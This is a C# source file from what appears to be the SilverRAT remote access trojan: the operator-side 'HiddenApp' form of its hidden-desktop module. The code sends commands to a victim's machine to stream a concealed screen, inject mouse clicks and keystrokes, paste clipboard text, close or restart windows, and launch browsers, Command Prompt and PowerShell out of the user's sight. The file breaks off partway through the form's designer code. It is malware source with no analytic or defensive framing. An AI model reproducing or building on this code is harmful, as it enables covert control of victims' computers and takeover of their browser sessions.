using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Connection;
using SilverRAT.Handle_Packet;
using SilverRAT.MessagePack;
using SilverRAT.StreamLibrary;
using SilverRAT.StreamLibrary.UnsafeCodecs;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class HiddenApp : Form
{
    private enum TypeColumnList
    {
        SectedName = 1,
        SelctedIndex,
        const_2,
        SelectedFilename
    }

    public int FPS = 0;

    public Stopwatch sw = Stopwatch.StartNew();

    public IUnsafeCodec decoder = new UnsafeStreamCodec(60);

    public Size rdSize;

    public object syncPicbox = new object();

    public object syncList = new object();

    private IContainer components = null;

    private BunifuElipse FormElipse;

    private BunifuDragControl FormDragControl1;

    public System.Windows.Forms.Timer TimerIsDisconnect;

    private Panel panelForm;

    private PictureBox pictureBox2;

    public BunifuCheckBox Speed;

    private Label label1;

    public BunifuLabel SizeScreen;

    public BunifuTextBox ScreenY;

    public BunifuTextBox ScreenX;

    private BunifuCheckBox EnabledResize;

    private Label TxDelay;

    internal Guna2HtmlLabel ValueQuality;

    public Guna2TrackBar QualityTrackBar;

    private Label MuneClose;

    private BunifuLabel bunifuLabel17;

    public Guna2GradientButton Power;

    public BunifuLabel InfoFPS;

    private Panel panel1;

    private TableLayoutPanel tableLayoutPanel1;

    public Guna2DataGridView ListWindows;

    public BunifuLabel Logs;

    public BunifuLabel CountWindows;

    public PictureBox ViewerBox;

    private Guna2ResizeBox FormResizeBox1;

    private BunifuPanel PanelTitle;

    public BunifuLoader LoaderConnect;

    private Guna2GradientButton ButtonMune;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    private Guna2CircleButton ButtonMaximized;

    private BunifuLabel UserIdInfo;

    private BunifuLabel bunifuLabel1;

    private PictureBox ImageLogo;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    private ContextMenuStrip contextMenuStrip1;

    private ToolStripMenuItem GetScreenWindow;

    private ToolStripMenuItem ActiveWindow;

    private ToolStripMenuItem RestartWindow;

    private ToolStripMenuItem CloseWindow;

    private ToolStripMenuItem RefreshList;

    public BunifuCheckBox WindowSize;

    private Label label2;

    private ToolStripMenuItem MuneBrowser;

    private ToolStripMenuItem MuneApplactions;

    public Panel PanelMune;

    private ToolStripMenuItem RestoreWindow;

    private ToolStripMenuItem MicrosoftEdgeBrowser;

    private ToolStripMenuItem ChromeBrowser;

    private ToolStripMenuItem FireFoxBrowser;

    private ToolStripMenuItem BraveBrowser;

    private ToolStripMenuItem CommandPrompt;

    private ToolStripMenuItem PowerShell;

    private ToolStripMenuItem CustomOpen;

    private DataGridViewImageColumn Column1;

    private DataGridViewTextBoxColumn dataGridViewTextBoxColumn2;

    private DataGridViewTextBoxColumn Column3;

    private DataGridViewTextBoxColumn Column2;

    private DataGridViewTextBoxColumn Column4;

    private BunifuCheckBox bunifuCheckBox_0;

    private Label label3;

    public FormSilver F { get; set; }

    public Bitmap Logo { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public string ScreenPath { get; set; }

    public Image GetImage { get; set; }

    public HiddenApp()
    {
        InitializeComponent();
        base.MouseWheel += MyMouseWheel;
        MinimumSize = base.Size;
    }

    private void HiddenApp_Load(object sender, EventArgs e)
    {
        ListWindows.Columns[2].Visible = false;
        ListWindows.Columns[3].Visible = false;
        ListWindows.Columns[4].Visible = false;
        PictureBox viewerBox = ViewerBox;
        lock (viewerBox)
        {
            Control viewerBox2 = ViewerBox;
            viewerBox2.KeyPress += KDW;
        }
        try
        {
            string userIDClient = Packet.GetUserIDClient(ParentClient.DGV);
            UserIdInfo.Text = userIDClient;
            userIDClient.Split('\\');
        }
        catch
        {
            UserIdInfo.Text = "Not Found!";
        }
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
            if (Logo != null)
            {
                ImageLogo.Image = Logo;
            }
        }
        catch
        {
        }
    }

    private void HiddenApp_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void ButtonMaximized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Maximized;
        }
        else if (base.WindowState == FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Normal;
        }
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void QualityTrackBar_Scroll(object sender, ScrollEventArgs e)
    {
        ValueQuality.Text = QualityTrackBar.Value + "% Quality";
    }

    private void ButtonMune_Click(object sender, EventArgs e)
    {
        if (!PanelMune.Visible)
        {
            Program.Silver.TransitionShowng.ShowSync(PanelMune);
        }
    }

    private void MuneClose_Click(object sender, EventArgs e)
    {
        Program.Silver.TransitionHiddeng.HideSync(PanelMune);
    }

    private void HiddenApp_ResizeEnd(object sender, EventArgs e)
    {
        if (Power.Text == "Stop" && ViewerBox.Image != null && WindowSize.Checked)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "Resize";
            msgPack.ForcePathObject("Width").AsInteger = Convert.ToInt32(ViewerBox.Width);
            msgPack.ForcePathObject("Height").AsInteger = Convert.ToInt32(ViewerBox.Height);
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void HiddenApp_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
        }
        catch
        {
        }
    }

    private void TimerIsDisconnect_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
            {
                ThreadPool.QueueUserWorkItem(delegate
                {
                    Client?.Disconnected();
                });
                Close();
            }
        }
        catch
        {
        }
    }

    private string GetValueSelctedList(TypeColumnList NumCells)
    {
        string result = null;
        foreach (DataGridViewRow selectedRow in ListWindows.SelectedRows)
        {
            result = selectedRow.Cells[(int)NumCells].Value.ToString();
        }
        return result;
    }

    private void Power_Click(object sender, EventArgs e)
    {
        try
        {
            if (Power.Text == "Start")
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Start";
                msgPack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(QualityTrackBar.Value.ToString());
                msgPack.ForcePathObject("X").AsInteger = Convert.ToInt32(ScreenX.Text.ToString());
                msgPack.ForcePathObject("Y").AsInteger = Convert.ToInt32(ScreenY.Text.ToString());
                msgPack.ForcePathObject("Resize").AsString = EnabledResize.Checked.ToString();
                msgPack.ForcePathObject("Speed").AsString = Speed.Checked.ToString();
                decoder = new UnsafeStreamCodec(Convert.ToInt32(QualityTrackBar.Value));
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                QualityTrackBar.Enabled = false;
                EnabledResize.Enabled = false;
                ScreenX.Enabled = false;
                ScreenY.Enabled = false;
                Power.Text = "Started...";
                Power.Enabled = false;
            }
            else
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "Stop";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
                QualityTrackBar.Enabled = true;
                EnabledResize.Enabled = true;
                ScreenX.Enabled = true;
                ScreenY.Enabled = true;
                Power.Text = "Stoped...";
                Power.Enabled = false;
            }
        }
        catch
        {
        }
    }

    private void GetScreenWindow_Click(object sender, EventArgs e)
    {
        try
        {
            if (ListWindows.SelectedRows.Count != 0)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "GetHWND";
                msgPack.ForcePathObject("Name").AsString = GetValueSelctedList(TypeColumnList.SectedName);
                msgPack.ForcePathObject("Index").AsInteger = Convert.ToInt32(GetValueSelctedList(TypeColumnList.SelctedIndex));
                msgPack.ForcePathObject("Width").AsInteger = Convert.ToInt32(ViewerBox.Width);
                msgPack.ForcePathObject("Height").AsInteger = Convert.ToInt32(ViewerBox.Height);
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void RefreshList_Click(object sender, EventArgs e)
    {
        try
        {
            if (ListWindows.SelectedRows.Count != 0)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Refresh";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void CloseWindow_Click(object sender, EventArgs e)
    {
        try
        {
            if (ListWindows.SelectedRows.Count != 0)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Close";
                msgPack.ForcePathObject("PID").AsString = GetValueSelctedList(TypeColumnList.const_2);
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void RestartWindow_Click(object sender, EventArgs e)
    {
        try
        {
            if (ListWindows.SelectedRows.Count != 0)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Restart";
                msgPack.ForcePathObject("Filename").AsString = GetValueSelctedList(TypeColumnList.SelectedFilename);
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void RestoreWindow_Click(object sender, EventArgs e)
    {
        try
        {
            if (ListWindows.SelectedRows.Count != 0)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Restore";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void MicrosoftEdgeBrowser_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "OpenEdgeBrowser";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void ChromeBrowser_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "OpenChromeBrowser";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void FireFoxBrowser_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "OpenFireFoxBrowser";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void BraveBrowser_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "OpenBraveBrowser";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void CommandPrompt_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "OpenCommandPrompt";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void PowerShell_Click(object sender, EventArgs e)
    {
        try
        {
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "OpenPowerShell";
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
        catch
        {
        }
    }

    private void CustomOpen_Click(object sender, EventArgs e)
    {
        try
        {
            if (!(Power.Text == "Stop"))
            {
                return;
            }
            string dwid = Guid.NewGuid().ToString();
            BeginInvoke((MethodInvoker)delegate
            {
                FormCustomOpen formCustomOpen = (FormCustomOpen)Application.OpenForms["Custom Open:" + dwid];
                if (formCustomOpen == null)
                {
                    using (formCustomOpen = new FormCustomOpen(Client, UserIdInfo.Text))
                    {
                        formCustomOpen.Name = "Custom Open:" + dwid;
                        formCustomOpen.Text = "Custom Open";
                        formCustomOpen.ShowDialog();
                    }
                }
            });
        }
        catch
        {
        }
    }

    public void KDW(object sender, KeyPressEventArgs e)
    {
        try
        {
            ViewerBox.Focus();
            if (Power.Text == "Stop" && ViewerBox.Image != null)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "keyboardClick";
                msgPack.ForcePathObject("Key").AsString = Convert.ToBase64String(Encoding.UTF8.GetBytes(e.KeyChar.ToString()));
                msgPack.ForcePathObject("KeyDown").SetAsBoolean(bVal: true);
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void CopyTxt_Click(object sender, EventArgs e)
    {
        try
        {
            if (Power.Text == "Stop" && ViewerBox.Image != null && ViewerBox.ContainsFocus)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Copy";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void PastTxt_Click(object sender, EventArgs e)
    {
        try
        {
            if (Power.Text == "Stop" && ViewerBox.Image != null && ViewerBox.ContainsFocus)
            {
                string text = Clipboard.GetText();
                if (text == null)
                {
                    MessageBox.Show(this, "Please copy the text to be pasted into the window", "Hidden Applactions | Clipboard!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    return;
                }
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Paste";
                msgPack.ForcePathObject("txt").AsString = Convert.ToBase64String(Encoding.UTF8.GetBytes(text));
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void ViewerBox_MouseDown(object sender, MouseEventArgs e)
    {
        ViewerBox.Focus();
        if (Power.Text == "Stop" && ViewerBox.Image != null && ViewerBox.ContainsFocus)
        {
            Point point = new Point(e.X * rdSize.Width / ViewerBox.Width, e.Y * rdSize.Height / ViewerBox.Height);
            if (e.Button == MouseButtons.Left)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "LeftDown";
                msgPack.ForcePathObject("X").AsString = point.X.ToString();
                msgPack.ForcePathObject("Y").AsString = point.Y.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
            if (e.Button == MouseButtons.Right)
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "RightDown";
                msgPack2.ForcePathObject("X").AsString = point.X.ToString();
                msgPack2.ForcePathObject("Y").AsString = point.Y.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
            }
        }
    }

    private void ViewerBox_MouseMove(object sender, MouseEventArgs e)
    {
        ViewerBox.Focus();
        if (Power.Text == "Stop" && ViewerBox.Image != null && ViewerBox.ContainsFocus)
        {
            Point point = new Point(e.X * rdSize.Width / ViewerBox.Width, e.Y * rdSize.Height / ViewerBox.Height);
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "MoveCursor";
            msgPack.ForcePathObject("X").AsString = point.X.ToString();
            msgPack.ForcePathObject("Y").AsString = point.Y.ToString();
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
    }

    private void ViewerBox_MouseUp(object sender, MouseEventArgs e)
    {
        ViewerBox.Focus();
        if (Power.Text == "Stop" && ViewerBox.Image != null && ViewerBox.ContainsFocus)
        {
            Point point = new Point(e.X * rdSize.Width / ViewerBox.Width, e.Y * rdSize.Height / ViewerBox.Height);
            if (e.Button == MouseButtons.Left)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "LeftUp";
                msgPack.ForcePathObject("X").AsString = point.X.ToString();
                msgPack.ForcePathObject("Y").AsString = point.Y.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
            if (e.Button == MouseButtons.Right)
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "RightUp";
                msgPack2.ForcePathObject("X").AsString = point.X.ToString();
                msgPack2.ForcePathObject("Y").AsString = point.Y.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
            }
        }
    }

    private void MyMouseWheel(object sender, MouseEventArgs e)
    {
        ViewerBox.Focus();
        if (Power.Text == "Stop" && ViewerBox.Image != null && ViewerBox.ContainsFocus)
        {
            Point point = new Point(e.X * rdSize.Width / ImageLogo.Width, e.Y * rdSize.Height / ImageLogo.Height);
            if (e.Delta < 0)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "ScrollDown";
                msgPack.ForcePathObject("X").AsString = point.X.ToString();
                msgPack.ForcePathObject("Y").AsString = point.Y.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
            else
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "ScrollUp";
                msgPack2.ForcePathObject("X").AsString = point.X.ToString();
                msgPack2.ForcePathObject("Y").AsString = point.Y.ToString();
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
            }
        }
    }

    private void EnbledFPS_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (bunifuCheckBox_0.Checked)
        {
            InfoFPS.Visible = false;
        }
        else
        {
            InfoFPS.Visible = true;
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.HiddenApp));
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties5 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties6 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties7 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties8 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
        System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.PanelMune = new System.Windows.Forms.Panel();
        this.bunifuCheckBox_0 = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label3 = new System.Windows.Forms.Label();
        this.WindowSize = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label2 = new System.Windows.Forms.Label();
        this.pictureBox2 = new System.Windows.Forms.PictureBox();
        this.Speed = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label1 = new System.Windows.Forms.Label();
        this.SizeScreen = new Bunifu.UI.WinForms.BunifuLabel();
        this.ScreenY = new Bunifu.UI.WinForms.BunifuTextBox();
        this.ScreenX = new Bunifu.UI.WinForms.BunifuTextBox();
        this.EnabledResize = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxDelay = new System.Windows.Forms.Label();
        this.ValueQuality = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.QualityTrackBar = new Guna.UI2.WinForms.Guna2TrackBar();
        this.MuneClose = new System.Windows.Forms.Label();
        this.bunifuLabel17 = new Bunifu.UI.WinForms.BunifuLabel();
        this.Power = new Guna.UI2.WinForms.Guna2GradientButton();
        this.InfoFPS = new Bunifu.UI.WinForms.BunifuLabel();
        this.panel1 = new System.Windows.Forms.Panel();
        this.tableLayoutPanel1 = new System.Windows.Forms.TableLayoutPanel();
        this.ListWindows = new Guna.UI2.WinForms.Guna2DataGridView();
        this.Column1 = new System.Windows.Forms.DataGridViewImageColumn();
        this.dataGridViewTextBoxColumn2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.Column4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
        this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
        this.GetScreenWindow = new System.Windows.Forms.ToolStripMenuItem();
        this.RefreshList = new System.Windows.Forms.ToolStripMenuItem();
        this.MuneBrowser = new System.Windows.Forms.ToolStripMenuItem();
        this.MicrosoftEdgeBrowser = new System.Windows.Forms.ToolStripMenuItem();
        this.ChromeBrowser = new System.Windows.Forms.ToolStripMenuItem();
        this.FireFoxBrowser = new System.Windows.Forms.ToolStripMenuItem();
        this.BraveBrowser = new System.Windows.Forms.ToolStripMenuItem();
        this.MuneApplactions = new System.Windows.Forms.ToolStripMenuItem();
        this.CommandPrompt = new System.Windows.Forms.ToolStripMenuItem();
        this.PowerShell = new System.Windows.Forms.ToolStripMenuItem();
        this.CustomOpen = new System.Windows.Forms.ToolStripMenuItem();
        this.ActiveWindow = new System.Windows.Forms.ToolStripMenuItem();
        this.RestoreWindow = new System.Windows.Forms.ToolStripMenuItem();
        this.RestartWindow = new System.Windows.Forms.ToolStripMenuItem();
        this.CloseWindow = new System.Windows.Forms.ToolStripMenuItem();
        this.Logs = new Bunifu.UI.WinForms.BunifuLabel();
        this.CountWindows = new Bunifu.UI.WinForms.BunifuLabel();
        this.ViewerBox = new System.Windows.Forms.PictureBox();
        this.FormResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.LoaderConnect = new Bunifu.UI.WinForms.BunifuLoader();
        this.ButtonMune = new Guna.UI2.WinForms.Guna2GradientButton();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtonMaximized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ImageLogo = new System.Windows.Forms.PictureBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.TimerIsDisconnect = new System.Windows.Forms.Timer(this.components);
        this.panelForm.SuspendLayout();
        this.PanelMune.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox2).BeginInit();
        this.panel1.SuspendLayout();
        this.tableLayoutPanel1.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ListWindows).BeginInit();
        this.contextMenuStrip1.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ViewerBox).BeginInit();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).BeginInit();
        base.SuspendLayout();
        this.FormElipse.ElipseRadius = 4;
        this.FormElipse.TargetControl = this.panelForm;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.PanelMune);
        this.panelForm.Controls.Add(this.InfoFPS);
        this.panelForm.Controls.Add(this.panel1);
        this.panelForm.Controls.Add(this.FormResizeBox1);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(691, 559);
        this.panelForm.TabIndex = 573;
        this.panelForm.Visible = false;
        this.PanelMune.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelMune.Controls.Add(this.bunifuCheckBox_0);
        this.PanelMune.Controls.Add(this.label3);
        this.PanelMune.Controls.Add(this.WindowSize);
        this.PanelMune.Controls.Add(this.label2);
        this.PanelMune.Controls.Add(this.pictureBox2);
        this.PanelMune.Controls.Add(this.Speed);
        this.PanelMune.Controls.Add(this.label1);
        this.PanelMune.Controls.Add(this.SizeScreen);
        this.PanelMune.Controls.Add(this.ScreenY);
        this.PanelMune.Controls.Add(this.ScreenX);
        this.PanelMune.Controls.Add(this.EnabledResize);
        this.PanelMune.Controls.Add(this.TxDelay);
        this.PanelMune.Controls.Add(this.ValueQuality);
        this.PanelMune.Controls.Add(this.QualityTrackBar);
        this.PanelMune.Controls.Add(this.MuneClose);
        this.PanelMune.Controls.Add(this.bunifuLabel17);
        this.PanelMune.Controls.Add(this.Power);
        this.PanelMune.Location = new System.Drawing.Point(432, 112);
        this.PanelMune.Name = "PanelMune";
        this.PanelMune.Size = new System.Drawing.Size(245, 418);
        this.PanelMune.TabIndex = 609;
        this.bunifuCheckBox_0.AllowBindingControlAnimation = true;
        this.bunifuCheckBox_0.AllowBindingControlColorChanges = false;
        this.bunifuCheckBox_0.AllowBindingControlLocation = true;
        this.bunifuCheckBox_0.AllowCheckBoxAnimation = true;
        this.bunifuCheckBox_0.AllowCheckmarkAnimation = true;
        this.bunifuCheckBox_0.AllowOnHoverStates = true;
        this.bunifuCheckBox_0.AutoCheck = true;
        this.bunifuCheckBox_0.BackColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.BackgroundImage = (System.Drawing.Image)resources.GetObject("EnbledFPS.BackgroundImage");
        this.bunifuCheckBox_0.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.bunifuCheckBox_0.BindingControl = this.label3;
        this.bunifuCheckBox_0.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.bunifuCheckBox_0.BorderRadius = 6;
        this.bunifuCheckBox_0.Checked = true;
        this.bunifuCheckBox_0.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Checked;
        this.bunifuCheckBox_0.Cursor = System.Windows.Forms.Cursors.Hand;
        this.bunifuCheckBox_0.CustomCheckmarkImage = null;
        this.bunifuCheckBox_0.Location = new System.Drawing.Point(7, 224);
        this.bunifuCheckBox_0.MinimumSize = new System.Drawing.Size(17, 17);
        this.bunifuCheckBox_0.Name = "EnbledFPS";
        this.bunifuCheckBox_0.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox_0.OnCheck.BorderRadius = 6;
        this.bunifuCheckBox_0.OnCheck.BorderThickness = 2;
        this.bunifuCheckBox_0.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox_0.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.OnCheck.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.bunifuCheckBox_0.OnDisable.BorderRadius = 6;
        this.bunifuCheckBox_0.OnDisable.BorderThickness = 2;
        this.bunifuCheckBox_0.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.bunifuCheckBox_0.OnDisable.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.bunifuCheckBox_0.OnHoverChecked.BorderRadius = 6;
        this.bunifuCheckBox_0.OnHoverChecked.BorderThickness = 2;
